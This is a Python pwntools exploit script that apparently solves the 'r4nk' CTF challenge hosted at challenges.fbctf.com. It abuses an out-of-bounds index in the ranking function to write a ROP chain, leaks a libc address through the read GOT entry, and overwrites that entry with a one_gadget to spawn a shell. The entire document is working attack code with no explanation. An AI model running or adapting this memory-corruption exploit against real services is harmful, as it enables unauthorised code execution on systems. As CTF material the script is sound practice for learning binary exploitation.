from pwn import *

#p=process('./r4nk')
p=remote('challenges.fbctf.com',1339)
e=ELF('./r4nk')
#context.log_level = 'debug'

def show():
    p.sendafter('>','1')

def rank(idx,val):
    p.sendafter('>','2\x00')
    p.sendafter('t1tl3>',str(idx)+'\x00')
    p.sendafter('r4nk>',str(val)+'\x00')

read_got=0x602030
pd=0x0000000000400b43
ps_p=0x0000000000400b41
leak = 0x4008b0
main = 0x400640
read_gadget = 0x4007b8

rank(17,pd)
rank(18,read_got)
rank(19,ps_p)
rank(20,0x8)
rank(21,"A"*8)
rank(22,leak)
rank(23,ps_p)
rank(24,read_got)
rank(25,"A"*8)
rank(26,read_gadget)
rank(27,read_gadget)
rank(28,read_gadget)
p.sendafter('>','3\x00')

p.recvline()
lb = u64(p.recvn(8))-0x110070
one_gadget = lb+0x4f2c5
print hex(lb)
p.sendline("0")
pause()
p.send(p64(one_gadget))

p.interactive()
